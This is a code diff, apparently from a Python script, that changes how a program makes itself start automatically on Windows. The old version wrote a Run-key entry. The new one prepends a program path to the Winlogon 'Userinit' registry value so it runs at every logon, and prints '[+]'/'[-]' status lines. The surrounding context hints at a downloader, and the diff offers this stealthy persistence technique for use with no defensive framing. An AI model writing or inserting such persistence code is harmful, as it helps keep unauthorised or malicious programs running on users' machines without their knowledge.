@@ -129,15 +129,31 @@ try {
 
         return shortcut_path
 
+    import winreg
+
     def add_registry_startup(path, name):
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            0,
-            winreg.KEY_SET_VALUE,
-        )
-        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}" &')
-        winreg.CloseKey(key)
+        reg_path = r"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+        value_name = "Userinit"
+        
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE) as key:
+                # Get existing value (default is usually "C:\Windows\system32\userinit.exe")
+                try:
+                    existing_value, _ = winreg.QueryValueEx(key, value_name)
+                except FileNotFoundError:
+                    existing_value = "C:\\Windows\\system32\\userinit.exe"  # Default Windows value
+
+                # Append your program while preserving userinit.exe
+                new_value = f'"{path}",{existing_value}'
+                
+                # Set the new registry value
+                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value)
+
+                print(f"[+] Successfully added {path} to {reg_path}\\{value_name}")
+
+        except Exception as e:
+            print(f"[-] Failed to modify registry: {e}")
+
 
     os_type = platform.system()
     download_path = file_path
